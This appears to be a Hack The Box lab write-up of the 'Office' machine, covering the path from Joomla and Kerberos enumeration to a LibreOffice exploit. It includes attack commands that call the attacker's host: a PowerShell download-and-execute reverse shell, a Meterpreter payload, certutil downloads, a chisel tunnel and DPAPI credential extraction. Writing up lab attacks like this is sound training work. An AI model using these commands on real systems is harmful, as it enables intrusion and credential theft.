---
title: "HTB Writeup: Office"
author: xpnt
date: 2024-06-22
image:
  path: https://pbs.twimg.com/media/GGYTVglW4AAhki3?format=jpg&name=medium
  height: 1500
  width: 500
categories: [Hack The Box, "Season 4: Savage Lands"]
tags: [labs,cve-2023-23752,joomla,SharpGPOAbuse,cve-2023-2255,LibreOffice,GenericWrite,ASREQroasting,DPAPI creds,wireshark,pcap,psexec.py]
---

# Writeup
- [Link: Pwned Date](https://www.hackthebox.com/achievement/machine/1504363/588)


## Enumeration
- The pentester begins with a port scan and discovers that the ports `53, 80, 88, 139, 389, 443, 445, 464, 593, 636, 3268, 3269, 5985, 9389, 49664, 49668, 57166, 57326, 57333, 57357` are open, typical on Windows targets. He notices the presence of the domain `office.htb` and the DNS name `dc.office.htb`, so he adds them to the `/etc/hosts` file.

```bash
Nmap scan report for 10.10.11.3
Host is up (0.13s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-favicon: Unknown favicon MD5: 1B6942E22443109DAEA739524AB74123
| http-robots.txt: 16 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-19 08:28:35Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-06-19T08:30:05+00:00; +8h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
|_SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
443/tcp   open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: 403 Forbidden
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
|_SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
|_ssl-date: 2024-06-19T08:30:06+00:00; +8h00m02s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
|_SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
|_ssl-date: 2024-06-19T08:30:05+00:00; +8h00m02s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
|_SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
|_ssl-date: 2024-06-19T08:30:06+00:00; +8h00m02s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
57166/tcp open  msrpc         Microsoft Windows RPC
57326/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
57333/tcp open  msrpc         Microsoft Windows RPC
57357/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-06-19T08:29:28
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 8h00m02s, deviation: 0s, median: 8h00m01s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun 18 20:30:04 2024 -- 1 IP address (1 host up) scanned in 99.79 seconds
```


- **DNS Enumeration**: A `Domain Zone Transfer` attack is not possible on this occasion.

```bash
❯ dig axfr office.htb @10.10.11.3

; <<>> DiG 9.19.21-1-Debian <<>> axfr office.htb @10.10.11.3
;; global options: +cmd
; Transfer failed.
```

>Tip: I always recommend performing an `any` query on the DNS service because it's possible to find additional IPs for the target, especially if it is `dual-homed`, meaning it has two network interfaces. In this case, it can be observed that in addition to the IP `10.10.11.3`, the target also has the IP `10.250.0.30`. This information will be used later on.
 {: .prompt-tip }

```bash
dig any office.htb @10.10.11.3

; <<>> DiG 9.19.21-1-Debian <<>> any office.htb @10.10.11.3
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 20261
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;office.htb.			IN	ANY

;; ANSWER SECTION:
office.htb.		600	IN	A	10.250.0.30
office.htb.		600	IN	A	10.10.11.3
office.htb.		3600	IN	NS	dc.office.htb.
office.htb.		3600	IN	SOA	dc.office.htb. hostmaster.office.htb. 64 900 600 86400 3600

;; ADDITIONAL SECTION:
dc.office.htb.		3600	IN	A	10.10.11.3

;; Query time: 119 msec
;; SERVER: 10.10.11.3#53(10.10.11.3) (TCP)
;; WHEN: Wed Jun 19 09:43:25 EDT 2024
;; MSG SIZE  rcvd: 151
```


- **SMB Enumeration**

```bash
smbmap -u 'notexist' -H 10.10.11.3

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 0 SMB session(s)     
```

```bash
smbclient -N -L 10.10.11.3
session setup failed: NT_STATUS_ACCESS_DENIED
```

```bash
crackmapexec smb 10.10.11.3 -u '' -p ''  --shares
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [-] office.htb\: STATUS_ACCESS_DENIED 
SMB         10.10.11.3      445    DC               [-] Error enumerating shares: Error occurs while reading from remote(104)
```

- **RPC Enumeration**
```bash
rpcclient -U '%' -N 10.10.11.3
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```

- **LDAP Enumeration**

```bash
ldapsearch -b "" -s base namingContexts -H ldap://10.10.11.3 -x
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectclass=*)
# requesting: namingContexts 
#

#
dn:
namingContexts: DC=office,DC=htb
namingContexts: CN=Configuration,DC=office,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=office,DC=htb
namingContexts: DC=DomainDnsZones,DC=office,DC=htb
namingContexts: DC=ForestDnsZones,DC=office,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

```bash
ldapsearch -b "DC=office,DC=htb" -H ldap://10.10.11.3 -x
# extended LDIF
#
# LDAPv3
# base <DC=office,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090CF8, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4f7c
```

- **Kerberos Enumeration**: Since this is a CTF, it's advisable to use a list such as `xato-net-10-million-usernames.txt` for enumerating users with `kerbrute`. This list contains `8295455` usernames, so it will take some time. I recommend running it in the background while we continue enumerating the interesting services.

```bash
kerbrute userenum -d OFFICE.HTB --dc 10.10.11.3 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 06/19/24 - Ronnie Flathers @ropnop

2024/06/19 00:28:31 >  Using KDC(s):
2024/06/19 00:28:31 >  	10.10.11.3:88

2024/06/19 00:28:53 >  [+] VALID USERNAME:	administrator@OFFICE.HTB
2024/06/19 00:31:12 >  [+] VALID USERNAME:	Administrator@OFFICE.HTB
2024/06/19 00:32:21 >  [+] VALID USERNAME:	ewhite@OFFICE.HTB
2024/06/19 00:32:21 >  [+] VALID USERNAME:	etower@OFFICE.HTB
2024/06/19 00:32:21 >  [+] VALID USERNAME:	dwolfe@OFFICE.HTB
2024/06/19 00:32:22 >  [+] VALID USERNAME:	dmichael@OFFICE.HTB
2024/06/19 00:32:22 >  [+] VALID USERNAME:	dlanor@OFFICE.HTB

2024/06/19 00:42:34 >  Done! Tested 67339 usernames (7 valid) in 843.388 seconds
```



- After a general reconnaissance of the typical services present on a Domain Controller, the pentester began to analyze the Joomla CMS (port 80) reported by the `nmap` scan. This site appears to be a blog centered around `Iron Man`, detailing aspects of the technologies it uses, armor design, etc.

![](/assets/images/HTB-Writeup-Office/Pasted image 20240618233623.png)

- The first thing he did was obtain the Joomla version, which is why he accessed `/administrator/manifests/files/joomla.xml` and discovered it was version `4.2.7`.

```bash
curl -s http://office.htb/administrator/manifests/files/joomla.xml | xmllint --format -
```


```xml
<?xml version="1.0" encoding="UTF-8"?>
<extension type="file" method="upgrade">
  <name>files_joomla</name>
  <author>Joomla! Project</author>
  <authorEmail>admin@joomla.org</authorEmail>
  <authorUrl>www.joomla.org</authorUrl>
  <copyright>(C) 2019 Open Source Matters, Inc.</copyright>
  <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
  <version>4.2.7</version>
  <creationDate>2023-01</creationDate>
  <description>FILES_JOOMLA_XML_DESCRIPTION</description>
  <scriptfile>administrator/components/com_admin/script.php</scriptfile>
  <update>
    <schemas>
      <schemapath type="mysql">administrator/components/com_admin/sql/updates/mysql</schemapath>
      <schemapath type="postgresql">administrator/components/com_admin/sql/updates/postgresql</schemapath>
    </schemas>
  </update>
  <fileset>
    <files>
      <folder>administrator</folder>
      <folder>api</folder>
      <folder>cache</folder>
      <folder>cli</folder>
      <folder>components</folder>
      <folder>images</folder>
      <folder>includes</folder>
      <folder>language</folder>
      <folder>layouts</folder>
      <folder>libraries</folder>
      <folder>media</folder>
      <folder>modules</folder>
      <folder>plugins</folder>
      <folder>templates</folder>
      <folder>tmp</folder>
      <file>htaccess.txt</file>
      <file>web.config.txt</file>
      <file>LICENSE.txt</file>
      <file>README.txt</file>
      <file>index.php</file>
    </files>
  </fileset>
  <updateservers>
    <server name="Joomla! Core" type="collection">https://update.joomla.org/core/list.xml</server>
  </updateservers>
</extension>
```

## Foothold
- A quick search for vulnerabilities related to `Joomla 4.2.7` led to the discovery of [`CVE-2023-23752 - Joomla Improper Access Check`](https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT).

![](/assets/images/HTB-Writeup-Office/Pasted image 20240618234758.png)

- This `CVE-2023-23752` relates to an improper access check within the application, which allows unauthorized access to critical web service endpoints.


![](/assets/images/HTB-Writeup-Office/Pasted image 20240619001613.png)

- [K3ysTr0K3R](https://github.com/K3ysTr0K3R) has an excellent Proof of Concept (PoC) that automates the collection of passwords and usernames to present them neatly.

![](/assets/images/HTB-Writeup-Office/Pasted image 20240619000330.png)

- The pentester attempted to access the Joomla dashboard using the credentials `administrator : H0lOgrams4reTakIng0Ver754!`, but it didn't work. At this point, the user enumeration process with the tool `kerbrute` had concluded. The pentester had a password (`H0lOgrams4reTakIng0Ver754!`) and a list of usernames, so he performed a `Password Spraying` attack using the tool `CrackMapExec` against the SMB service, discovering valid credentials: `dwolfe : H0lOgrams4reTakIng0Ver754!`.

```bash
crackmapexec smb 10.10.11.3 -u users.txt -p 'H0lOgrams4reTakIng0Ver754!' -d OFFICE.HTB
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:OFFICE.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [-] OFFICE.HTB\administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] OFFICE.HTB\Administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] OFFICE.HTB\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] OFFICE.HTB\etower:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [+] OFFICE.HTB\dwolfe:H0lOgrams4reTakIng0Ver754! 
```

- Since we have valid credentials for a domain user, we'll use `bloodhound-python`, a Python-based ingestor for BloodHound, to extract domain information for further analysis.

```bash
sudo bloodhound-python -u 'dwolfe' -p 'H0lOgrams4reTakIng0Ver754!' -d OFFICE.HTB -c all -ns 10.10.11.3
```

![](/assets/images/HTB-Writeup-Office/Pasted image 20240619123841.png)

- Afterward, we'll compress all the `JSON` files into a `zip` file to upload them to BloodHound.

```bash
zip office_ad.zip *json
```

![](/assets/images/HTB-Writeup-Office/Pasted image 20240619124003.png)

![](/assets/images/HTB-Writeup-Office/Pasted image 20240619124652.png)

- Once the  `json` files are uploaded, the domain is enumerated. I used several queries from the `Pre-Built Analytics Queries` and inspected the `Node Info` tab, but had no luck.





![](/assets/images/HTB-Writeup-Office/Pasted image 20240619130201.png)

- Additionally, the pentester attempted to access the Joomla dashboard with this new set of credentials, but it didn't work. Enumeration is an iterative process, and now that we have a set of credentials (`dwolfe` : `H0lOgrams4reTakIng0Ver754!`), he re-enumerated the SMB and WinRM services with these new credentials.


- There was no success with the WinRM service, but SMB was successful. It was noted that there are shares accessible to the user `dwolfe`, among which the folder `SOC Analysis` stands out.

```bash
crackmapexec smb 10.10.11.3 -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' -d OFFICE.HTB --shares
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:OFFICE.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [+] OFFICE.HTB\dwolfe:H0lOgrams4reTakIng0Ver754! 
SMB         10.10.11.3      445    DC               [+] Enumerated shares
SMB         10.10.11.3      445    DC               Share           Permissions     Remark
SMB         10.10.11.3      445    DC               -----           -----------     ------
SMB         10.10.11.3      445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.3      445    DC               C$                              Default share
SMB         10.10.11.3      445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.3      445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.3      445    DC               SOC Analysis    READ            
SMB         10.10.11.3      445    DC               SYSVOL          READ            Logon server share  
```

- The pentester further enumerated the shared directory `SOC Analysis` using the tool `smbmap`.


```bash
smbmap -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' -r 'SOC Analysis' -H 10.10.11.3

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.11.3:445	Name: office.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SOC Analysis                                      	READ ONLY	
	./SOC Analysis
	dr--r--r--                0 Wed May 10 14:52:24 2023	.
	dr--r--r--                0 Wed Feb 14 05:18:31 2024	..
	fr--r--r--          1372860 Wed May 10 14:51:42 2023	Latest-System-Dump-8fbc124d.pcap
	SYSVOL                                            	READ ONLY	Logon server share 
```


- Noticing the existence of a `.pcap` file, that's why he downloaded this file onto their attacker machine.

```bash
smbmap -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' -H 10.10.11.3 --download 'SOC Analysis/Latest-System-Dump-8fbc124d.pcap'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
[+] Starting download: SOC Analysis\Latest-System-Dump-8fbc124d.pcap (1372860 bytes)
[+] File output to: /home/kali/HTB/Office/content/10.10.11.3-SOC Analysis_Latest-System-Dump-8fbc124d.pcap
```

- To conduct a more in-depth analysis, the pentester opens the file with `Wireshark`. Within the packet flow, he noticed the existence of multiple protocols, but one in particular caught his attention: the `Kerberos` protocol, as these could contain `Service Tickets` encrypted with the `Secret Key of a service` (`Kerberoasting Attack`), potentially allowing the generation of a hash to crack later, etc.

![](/assets/images/HTB-Writeup-Office/Pasted image 20240619101412.png)

## Understanding **AS-REQroasting attack**
- After the pentester filtered for packets belonging to the `Kerberos` protocol, he observed that these packets were part of an `AS-REQ`. Therefore, it is possible to attempt to exploit the `AS-REQroasting attack`. To do this, it is necessary to generate the hash in `Hashcat` format. Since this uses `Encryption Type 18`, according to the official documentation of [`Hashcat`](https://hashcat.net/wiki/doku.php?id=example_hashes), this corresponds to `mode` `19900` and requires the following fields:

```shell
$krb5pa$18$<principal_name_here>$HASHCATDOMAIN.COM$<cipher_bytes_here>
```

> Comments: It's interesting to note that the existence of the 2 captured packets in the `Kerberos traffic` is due to the fact that in the first packet, the user `tstark` attempted to authenticate by providing only their `username`, which was rejected by the `KDC` service. The KDC then requested a `timestamp` (`TS`) encrypted with the user’s secret. Consequently, in the second packet, we can see how the user `tstark` sent this information. This highlights that `Kerberos Pre-Authentication is enabled`, thereby preventing an `AS-REProasting Attack` from being exploited.
>
>**First packet**
>
>![](/assets/images/HTB-Writeup-Office/Pasted image 20240619113310.png)
>
>**Second packet**
>
>![](/assets/images/HTB-Writeup-Office/Pasted image 20240619112617.png)
>
 {: .prompt-info }


>Tip: The essence of the `AS-REProasting Attack` is as follows: When you do not enforce `pre-authentication`, a malicious attacker can directly send a `dummy request for authentication`. The `KDC` will return an encrypted `TGT` and `TGS' Session Key` encrypted with the `user secret key`. It is evident that the encrypted `TGS' Session Key` is attractive to the attacker because it can brute-force it offline in order to discover the `user's secret`.
>
> If you want to see more, [rioasmara](https://rioasmara.com/author/rioasmara/) has a [post](https://rioasmara.com/2020/07/04/kerberoasting-as-req-pre-auth-vs-non-pre-auth/) where he compares the behavior when `PRE-AUTH` (**Kerberos preauthentication**) is enabled versus when it's not, showing packet captures in Wireshark.
 {: .prompt-tip }


- Visualizing the captured Kerberos traffic in Wireshark, we can identify the following fields in the second Kerberos packet:

![](/assets/images/HTB-Writeup-Office/Pasted image 20240619122115.png)

- Thus, the resulting hash is:

```shell
$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
```

## Shell as "tstark" user and **user.txt**
- The pentester cracked the hash with `hashcat`, discovering that the password for the user `tstark` is presumably `playboy69`.

![](/assets/images/HTB-Writeup-Office/Pasted image 20240619123145.png)

- With this, the pentester observed once again the information provided by `BloodHound` for the user `tstark` and noticed that `tstark` is part of the `Registry Editors` group, as well as domain user `ppotts`.

![](/assets/images/HTB-Writeup-Office/Pasted image 20240619131543.png)


- The pentester has obtained new credentials (`tstark` : `playboy69`). Enumeration is an iterative process; however, this time access to the target via WinRM was unsuccessful, and no interesting files were found in SMB. Therefore, the pentester attempted to access the `admin` dashboard of Joomla with this new pair of credentials, but had no luck. Later, using the same password, the pentester tried the `administrator` username and successfully logged in!

![](/assets/images/HTB-Writeup-Office/Pasted image 20240619140237.png)

- Then, exploiting Joomla as the user `administrator` is straightforward in most cases. The pentester will modify a PHP file, uploading a webshell inside a template. This time, the pentester chose [`p0wny-shell`](https://github.com/flozz/p0wny-shell?tab=readme) as the webshell.

![](/assets/images/HTB-Writeup-Office/Pasted image 20240619142929.png)

- Then, the pentester obtained a reverse shell using the PowerShell script [`Invoke-PowerShell.ps1`](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). He added a line at the end of the script to call the function.

![](/assets/images/HTB-Writeup-Office/Pasted image 20240619143306.png)

- Then, he simply executed the following command and received a reverse shell.


```powershell
powershell -c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.69/Invoke-PowerShellTcp.ps1')
```


![](/assets/images/HTB-Writeup-Office/Pasted image 20240619143917.png)


![](/assets/images/HTB-Writeup-Office/Pasted image 20240619143857.png)

- Since the pentester had credentials for the user `tstark`, he used [`RunasCs.exe`](https://github.com/antonioCoco/RunasCs/releases) to obtain a Meterpreter reverse shell as the user `tstark`.


```shell
msfvenom -p windows/x64/meterpreter/reverse_https lhost=10.10.14.69 lport=4445 -f exe -o revshmet.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 609 bytes
Final size of exe file: 7168 bytes
Saved as: revshmet.exe
```


- He uploaded the necessary files to the writable directory `c:\windows\tasks` using `certutil.exe` and granted `Full` privileges to the `Everyone` group for the executable `revshmet.exe`.

```shell
PS C:\windows\tasks> certutil.exe -f -urlcache -split http://10.10.14.69/RunasCs.exe
PS C:\windows\tasks> certutil.exe -f -urlcache -split http://10.10.14.69/revshmet.exe
```


```shell
PS C:\windows\tasks> dir
    Directory: C:\windows\tasks
Mode                 LastWriteTime         Length Name                                                              
----                 -------------         ------ ----                                                              
                                                        
-a----         6/19/2024   8:50 PM           7168 revshmet.exe                                                      
-a----         6/19/2024   8:48 PM          51712 RunasCs.exe  
```



>Comments: It is important to grant `Full` privileges to the `Everyone` group for the executable `revshmet.exe` so that `RunasCs.exe` can execute it correctly.
>
```shell
cmd /c "icacls C:\windows\tasks\revshmet.exe  /grant Everyone:(F)"
```
>
>![](/assets/images/HTB-Writeup-Office/Pasted image 20240619163017.png)
{: .prompt-info }

- With all that done, he executed `RunasCs.exe`, received the reverse shell as the user `tstark`, and was able to read `user.txt`.

```shell
c:\windows\tasks\RunasCs.exe tstark playboy69 c:\windows\tasks\revshmet.exe
```

![](/assets/images/HTB-Writeup-Office/Pasted image 20240619163204.png)

## Shell as "ppotts" user 
- After extensive enumeration, the pentester noticed that port `8083` was `LISTENING` on all interfaces, but this was not reported in the `nmap` scan. Therefore, he decided to forward this port using `chisel.exe`.


- He uploaded the file `chisel_windows_amd64.exe` using the `upload` command of `meterpreter`.

```shell
upload chisel_windows_amd64.exe c:\\windows\\tasks
```

![](/assets/images/HTB-Writeup-Office/Pasted image 20240619170205.png)

- He forwarded port `8083` to port `8083` on his attack machine.

```bash
c:\windows\tasks\chisel_windows_amd64.exe client 10.10.14.69:8050 R:8083:127.0.0.1:8083
```

![](/assets/images/HTB-Writeup-Office/Pasted image 20240619172449.png)

```bash
chisel server -p 8050 --reverse
```

- Given that port `8083` is accessible, the pentester inspected the website.

- The pentester found it strange that uploading `.odt` files was allowed. After a quick search for recent vulnerabilities, he discovered `CVE-2023-2255`.

![](/assets/images/HTB-Writeup-Office/Pasted image 20240620003131.png)

- The CVE affects versions of `LibreOffice prior to 6.3`, allowing command execution upon opening files without any alerts. This stems from inadequate access controls in editor components handling documents with 'floating frames' linked to external files. The pentester discovered the target was running `LibreOffice 5.2.6.2` and due to the suggestive message indicating that a user would be reviewing the `resume` sent in the form `Job Application Submission`, he attempted to exploit this vulnerability

```shell
powershell -c "Get-WmiObject -Class Win32_Product |  select Name, Version"
```

![](/assets/images/HTB-Writeup-Office/Pasted image 20240620004520.png)

> Comments: If you want to learn more about this vulnerability, check out the repository of [Icare1337](https://github.com/Icare1337/LibreOffice_Tips_Bug_Bounty/commits?author=Icare1337) for [CVE-2023-2255](https://github.com/Icare1337/LibreOffice_Tips_Bug_Bounty/tree/main/CVE-2023-2255).
 {: .prompt-info }

- [`elweth-sec`](https://github.com/elweth-sec) has an excellent [PoC](https://github.com/elweth-sec/CVE-2023-2255). The pentester used this PoC to generate a malicious `.odt` (`exploit.odt`) file, which will execute the payload generated earlier using `msfvenom` (`revshmet.exe`). This way, he would be able to obtain a reverse shell as the user who was reviewing the odt files.

```shell
python3 CVE-2023-2255.py --cmd 'c:\windows\task\revshmet.exe' --output 'exploit.odt'
```

![](/assets/images/HTB-Writeup-Office/Pasted image 20240619175337.png)

- Then the pentester proceeded to upload the `exploit.odt` file to the target website located on port `8083`. Assuming there is a user reviewing the Job Application Submissions, the payload executed successfully. After some time, great! The pentester received a reverse shell as another user named `ppotts`.

![](/assets/images/HTB-Writeup-Office/Pasted image 20240619175643.png)

![](/assets/images/HTB-Writeup-Office/Pasted image 20240619175817.png)

## GPO Abuse and **root.txt**
- After extensive enumeration, the pentester executed `winpeasx64.exe` to thoroughly enumerate for any details that might have been overlooked. In doing so, he discovered the existence of `DPAPI Credentials file` and `DPAPI Master Keys`!!

- There are different ways to read the `DPAPI Credentials file`, from manual to automated ways, in this case the pentester used the automated way.

> Tip: It's worth mentioning that the latest version of the tool [`SharpDPAPI`](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpDPAPI.exe) is capable of extracting credentials protected by DPAPI.
 {: .prompt-tip }
- Upload `SharpDPAPI.exe`
```bash
upload SharpDPAPI.exe c:\\windows\\tasks
```

![](/assets/images/HTB-Writeup-Office/Pasted image 20240619201246.png)

- Execute `SharpDPAPI.exe`

```shell
c:\windows\tasks\SharpDPAPI.exe credentials /rpc

  __                 _   _       _ ___ 
